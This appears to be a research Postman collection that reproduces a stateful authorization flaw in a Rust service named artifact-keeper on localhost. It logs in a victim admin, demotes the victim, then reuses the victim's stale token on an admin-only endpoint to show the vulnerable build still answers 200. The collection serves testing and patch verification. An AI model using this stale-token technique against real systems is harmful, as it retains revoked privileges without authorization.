@@ -1,0 +1,299 @@
+{
+  "info": {
+    "name": "artifact-keeper (A1 stateful-authz)",
+    "description": "Third-party Rust target (held-out, then development target for AF2's admin-boolean detection). Both the VULNERABLE and the PATCHED build run on the SAME port http://localhost:8080 (unlike reports-api and vampi, which use two ports): swap behaviour by rebuilding the backend image, not by changing baseUrl. The container is behind docker-compose.local-dev.yml + docker-compose.thesis.yml.\n\nNO HTTP RESET ENDPOINT. Seeding is a shell script (infra/em-results/artifactkeeper-20261001/reseed.sh), which wipes the postgres volume, changes admin's password from admin/admin to Thesis-Pass-1234, then creates victim (is_admin=true) and viewer (is_admin=false). RUN THAT SCRIPT BEFORE THE DEMO. After the demo the victim is is_admin=false in the DB, so a second run without reseed will not reproduce (a fresh victim login would then be denied at the source step).\n\nUsers (all password Thesis-Pass-1234 after reseed): admin (operator, stable ADMIN), victim (ADMIN, demoted during the demo), viewer (non-admin). Login POST /api/v1/auth/login returns {\"access_token\":...}; sent as Authorization: Bearer <token>. The victim's user id is a per-reseed UUID, so the 'A1 bug demo' folder discovers it with GET /api/v1/users before the transition.\n\nA1 triple (matches the machine-generated 970 test, vuln-seed1 test_12): source POST /api/v1/admin/analytics/snapshot with victim token (200); transition PATCH /api/v1/users/{victimId} {\"is_admin\":false} with admin token (200); follow-up POST snapshot with the stale victim token. On the VULNERABLE build the follow-up returns 200 (bug); on the PATCHED build it returns 403.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    { "key": "baseUrl", "value": "http://localhost:8080" },
+    { "key": "password", "value": "Thesis-Pass-1234" },
+    { "key": "token", "value": "" },
+    { "key": "victimToken", "value": "" },
+    { "key": "operatorToken", "value": "" },
+    { "key": "victimId", "value": "" }
+  ],
+  "item": [
+    {
+      "name": "Setup",
+      "item": [
+        {
+          "name": "GET /health",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": { "raw": "{{baseUrl}}/health", "host": ["{{baseUrl}}"], "path": ["health"] },
+            "description": "Liveness. Expect 200 once the backend is up. There is no HTTP reseed; run reseed.sh for a clean state."
+          }
+        },
+        {
+          "name": "POST /api/v1/auth/login (admin / operator)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "var j = pm.response.json();",
+                  "if (j && j.access_token) { pm.collectionVariables.set('token', j.access_token); pm.collectionVariables.set('operatorToken', j.access_token); }"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" } ],
+            "body": { "mode": "raw", "raw": "{\"username\":\"admin\",\"password\":\"{{password}}\"}" },
+            "url": { "raw": "{{baseUrl}}/api/v1/auth/login", "host": ["{{baseUrl}}"], "path": ["api", "v1", "auth", "login"] },
+            "description": "Stores access_token into {{token}} and {{operatorToken}}. Assumes reseed.sh already changed admin's password to Thesis-Pass-1234. On a brand-new DB admin is admin/admin until that runs."
+          }
+        },
+        {
+          "name": "POST /api/v1/auth/login (victim)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "var j = pm.response.json();",
+                  "if (j && j.access_token) { pm.collectionVariables.set('token', j.access_token); pm.collectionVariables.set('victimToken', j.access_token); }"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" } ],
+            "body": { "mode": "raw", "raw": "{\"username\":\"victim\",\"password\":\"{{password}}\"}" },
+            "url": { "raw": "{{baseUrl}}/api/v1/auth/login", "host": ["{{baseUrl}}"], "path": ["api", "v1", "auth", "login"] }
+          }
+        },
+        {
+          "name": "POST /api/v1/auth/login (viewer)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "var j = pm.response.json();",
+                  "if (j && j.access_token) { pm.collectionVariables.set('token', j.access_token); }"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" } ],
+            "body": { "mode": "raw", "raw": "{\"username\":\"viewer\",\"password\":\"{{password}}\"}" },
+            "url": { "raw": "{{baseUrl}}/api/v1/auth/login", "host": ["{{baseUrl}}"], "path": ["api", "v1", "auth", "login"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Users",
+      "item": [
+        {
+          "name": "GET /api/v1/users (list, find victim id)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "var j = pm.response.json();",
+                  "var items = (j && j.items) ? j.items : [];",
+                  "var v = items.filter(function (u) { return u.username === 'victim'; })[0];",
+                  "if (v && v.id) { pm.collectionVariables.set('victimId', v.id); console.log('victimId = ' + v.id); }"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [ { "key": "Authorization", "value": "Bearer {{token}}" } ],
+            "url": { "raw": "{{baseUrl}}/api/v1/users", "host": ["{{baseUrl}}"], "path": ["api", "v1", "users"] },
+            "description": "ADMIN only. Returns {items:[{id,username,is_admin,...}], pagination}. Stores victim's UUID into {{victimId}}."
+          }
+        },
+        {
+          "name": "GET /api/v1/users/{id}",
+          "request": {
+            "method": "GET",
+            "header": [ { "key": "Authorization", "value": "Bearer {{token}}" } ],
+            "url": { "raw": "{{baseUrl}}/api/v1/users/{{victimId}}", "host": ["{{baseUrl}}"], "path": ["api", "v1", "users", "{{victimId}}"] }
+          }
+        },
+        {
+          "name": "PATCH /api/v1/users/{id} (transition: demote)",
+          "request": {
+            "method": "PATCH",
+            "header": [ { "key": "Content-Type", "value": "application/json" }, { "key": "Authorization", "value": "Bearer {{token}}" } ],
+            "body": { "mode": "raw", "raw": "{\"is_admin\":false}" },
+            "url": { "raw": "{{baseUrl}}/api/v1/users/{{victimId}}", "host": ["{{baseUrl}}"], "path": ["api", "v1", "users", "{{victimId}}"] },
+            "description": "ADMIN only. {\"is_admin\":false} is the permission-reducing transition; {\"is_admin\":true} restores."
+          }
+        },
+        {
+          "name": "POST /api/v1/users (create, ADMIN)",
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" }, { "key": "Authorization", "value": "Bearer {{token}}" } ],
+            "body": { "mode": "raw", "raw": "{\"username\":\"probe1\",\"email\":\"probe1@probe.test\",\"password\":\"{{password}}\",\"is_admin\":false}" },
+            "url": { "raw": "{{baseUrl}}/api/v1/users", "host": ["{{baseUrl}}"], "path": ["api", "v1", "users"] },
+            "description": "ADMIN only (non-admin -> 403). The alternative source write used by the hand-check (handcheck-clean.sh)."
+          }
+        }
+      ]
+    },
+    {
+      "name": "Admin",
+      "item": [
+        {
+          "name": "POST /api/v1/admin/analytics/snapshot (guard, ADMIN)",
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Authorization", "value": "Bearer {{token}}" }, { "key": "Accept", "value": "application/json" } ],
+            "url": { "raw": "{{baseUrl}}/api/v1/admin/analytics/snapshot", "host": ["{{baseUrl}}"], "path": ["api", "v1", "admin", "analytics", "snapshot"] },
+            "description": "ADMIN only, no body, repeatable. Denied -> 403. The guarded write used as source and follow-up in the A1 triple."
+          }
+        }
+      ]
+    },
+    {
+      "name": "A1 bug demo (970 triple)",
+      "description": "Run reseed.sh first, then run this folder top to bottom. victim = victim, operator = admin. VULNERABLE build (:8080): step 6 returns 200. PATCHED build (:8080): step 6 returns 403. Behaviour is set by which backend image is running, not by baseUrl.",
+      "item": [
+        {
+          "name": "1. login admin (operator token)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "var j = pm.response.json();",
+                  "if (j && j.access_token) { pm.collectionVariables.set('operatorToken', j.access_token); }",
+                  "pm.test('login 200', function () { pm.response.to.have.status(200); });"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" } ],
+            "body": { "mode": "raw", "raw": "{\"username\":\"admin\",\"password\":\"{{password}}\"}" },
+            "url": { "raw": "{{baseUrl}}/api/v1/auth/login", "host": ["{{baseUrl}}"], "path": ["api", "v1", "auth", "login"] }
+          }
+        },
+        {
+          "name": "2. GET /api/v1/users as admin (capture victimId)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "var j = pm.response.json();",
+                  "var items = (j && j.items) ? j.items : [];",
+                  "var v = items.filter(function (u) { return u.username === 'victim'; })[0];",
+                  "pm.test('victim found', function () { pm.expect(v, 'victim user present').to.be.an('object'); });",
+                  "if (v && v.id) { pm.collectionVariables.set('victimId', v.id); console.log('victimId = ' + v.id + ' is_admin=' + v.is_admin); }"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [ { "key": "Authorization", "value": "Bearer {{operatorToken}}" } ],
+            "url": { "raw": "{{baseUrl}}/api/v1/users", "host": ["{{baseUrl}}"], "path": ["api", "v1", "users"] }
+          }
+        },
+        {
+          "name": "3. login victim (pre-transition token)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "var j = pm.response.json();",
+                  "if (j && j.access_token) { pm.collectionVariables.set('victimToken', j.access_token); }",
+                  "pm.test('login 200', function () { pm.response.to.have.status(200); });"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" } ],
+            "body": { "mode": "raw", "raw": "{\"username\":\"victim\",\"password\":\"{{password}}\"}" },
+            "url": { "raw": "{{baseUrl}}/api/v1/auth/login", "host": ["{{baseUrl}}"], "path": ["api", "v1", "auth", "login"] }
+          }
+        },
+        {
+          "name": "4. source: snapshot with victim token (expect 200)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [ "pm.test('source ALLOWED 200', function () { pm.response.to.have.status(200); });" ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Authorization", "value": "Bearer {{victimToken}}" }, { "key": "Accept", "value": "application/json" } ],
+            "url": { "raw": "{{baseUrl}}/api/v1/admin/analytics/snapshot", "host": ["{{baseUrl}}"], "path": ["api", "v1", "admin", "analytics", "snapshot"] }
+          }
+        },
+        {
+          "name": "5. transition: PATCH victim is_admin=false with admin token (expect 200)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('transition 200', function () { pm.response.to.have.status(200); });",
+                  "pm.test('victim now is_admin=false', function () { pm.expect(pm.response.json().is_admin).to.eql(false); });"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "PATCH",
+            "header": [ { "key": "Content-Type", "value": "application/json" }, { "key": "Authorization", "value": "Bearer {{operatorToken}}" }, { "key": "Accept", "value": "application/json" } ],
+            "body": { "mode": "raw", "raw": "{\"is_admin\":false}" },
+            "url": { "raw": "{{baseUrl}}/api/v1/users/{{victimId}}", "host": ["{{baseUrl}}"], "path": ["api", "v1", "users", "{{victimId}}"] }
+          }
+        },
+        {
+          "name": "6. follow-up: snapshot with STALE victim token (vuln 200 / patched 403)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('follow-up status', function () {",
+                  "  pm.expect([200, 403]).to.include(pm.response.code);",
+                  "});",
+                  "console.log('follow-up code = ' + pm.response.code + ' (200 = BUG A1, 403 = patched)');"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Authorization", "value": "Bearer {{victimToken}}" }, { "key": "Accept", "value": "application/json" } ],
+            "url": { "raw": "{{baseUrl}}/api/v1/admin/analytics/snapshot", "host": ["{{baseUrl}}"], "path": ["api", "v1", "admin", "analytics", "snapshot"] },
+            "description": "Reuses victim's pre-transition token, no re-login. On the VULNERABLE build still 200; on the PATCHED build 403."
+          }
+        }
+      ]
+    }
+  ]
+}
